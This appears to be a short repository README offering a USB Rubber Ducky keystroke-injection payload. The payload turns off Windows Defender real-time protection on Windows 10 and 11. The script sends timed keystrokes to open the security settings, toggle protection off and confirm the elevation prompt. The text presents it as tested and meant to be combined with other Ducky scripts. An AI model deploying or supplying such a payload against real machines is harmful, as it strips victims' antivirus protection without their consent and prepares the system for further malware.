# A Payload That Will Disable Windows Defender

## This Code Was Tested On Windows 10 OS build 19043.1288 And Windows 11 OS build 22000.282 

### Date : 04-11-2021

Note : Older PC's May Require More Delay.

This Code Can Also Combined With Other Ducky Scripts.

```
REM Author : @krishnachaittanyah
REM This Script Will Disable Real Time Protection
REM *********************
REM We're going to disable Real Time Protection
REM *********************
DELAY 1000
GUI 
DELAY 500
STRING virus & threat protection
ENTER
DELAY 3000
TAB 
TAB
TAB
TAB
DELAY 200
ENTER
DELAY 200
SPACE 
DELAY 3000
ALT y
```